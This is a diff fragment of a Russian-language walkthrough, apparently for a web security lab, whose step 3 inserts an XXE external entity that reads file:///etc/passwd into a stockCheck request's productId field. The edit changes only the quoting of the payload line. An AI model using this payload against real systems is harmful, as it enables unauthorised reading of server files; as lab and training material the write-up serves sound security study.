@@ -9,7 +9,7 @@
  ![](0001.png)
  
  3) Изменяем запрос, вставляем обращение к сущности - файлу, который нам нужно вытащить :
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
 <stockCheck><productId>&xxe;</productId
  
  ![](0002.png)
